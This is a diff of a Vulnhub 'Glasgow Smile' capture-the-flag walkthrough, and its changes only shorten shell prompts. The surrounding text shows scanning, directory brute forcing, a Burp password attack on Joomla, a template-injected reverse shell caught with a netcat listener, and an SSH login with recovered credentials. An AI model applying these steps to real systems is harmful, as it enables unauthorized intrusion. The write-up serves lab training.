@@ -16,7 +16,7 @@ Glasgow Smile 1.1 is a boot to root machine available on Vulnhub. It consists of
 
 
 ```r
-root@kali:~/vulnhub/glasgowSmile# cat /etc/hosts
+root@kali:~# cat /etc/hosts
 127.0.0.1       localhost
 127.0.1.1       kali
 192.168.1.8     joker
@@ -27,7 +27,7 @@ root@kali:~/vulnhub/glasgowSmile# cat /etc/hosts
 As usual, I started with Nmap checking for open ports and default scripts.
 
 ```r
-root@kali:~/vulnhub/glasgowSmile# nmap -sC -sV -oA nmap/glasgowSmile joker
+root@kali:~# nmap -sC -sV -oA nmap/glasgowSmile joker
 Starting Nmap 7.80 ( https://nmap.org )
 Nmap scan report for joker (192.168.1.8)
 Host is up (0.00092s latency).
@@ -50,7 +50,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.74 seconds
 We have an ssh port open and an Apache Web Server running on port 80. Looking at port 80, I found an image of "Joker". Next, I performed a gobuster scan to look for hidden directories.
 
 ```r
-root@kali:~/vulnhub/glasgowSmile# gobuster dir -u http://joker -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+root@kali:~# gobuster dir -u http://joker -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -87,7 +87,7 @@ I tried logging in with some random usernames and passwords such as admin:admin,
 The next option was to brute force the login credentials, For this I used Burp Suite. Before that we need a wordlist, I created it using cewl.
 
 ```r
-root@kali:~/vulnhub/glasgowSmile# cewl http://joker/joomla >> keywords.txt
+root@kali:~# cewl http://joker/joomla >> keywords.txt
 ```
 
 Now Let's fire up Burp Suite and intercept the login request. Once the request is captured, right click on the request and select <b>Send to Intruder</b> option.
@@ -133,7 +133,7 @@ We have a template named Protostar installed. I decided to edit this template an
 After that, I started a net cat listener on port 9001 and visited the index.php at <b>http://joker/joomla</b> and we managed to get a reverse shell.
 
 ```r
-root@kali:~/vulnhub/glasgowSmile# nc -lvnp 9001
+root@kali:~# nc -lvnp 9001
 listening on [any] 9001 ...
 connect to [192.168.1.7] from (UNKNOWN) [192.168.1.8] 58078
 Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
@@ -181,7 +181,7 @@ www-data@glasgowsmile:/var/www/joomla2$ echo -n Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRo
 Now we can use these credentials to login via ssh as user <b>rob</b> and read our first flag.
 
 ```r
-root@kali:~/vulnhub/glasgowSmile# ssh rob@joker
+root@kali:~# ssh rob@joker
 
 The authenticity of host 'joker (192.168.1.8)' cant be established.
 ECDSA key fingerprint is SHA256:05TCY2Nw37yPYIluFAe7y4vTCupftlAxY+jXZsTJu88.
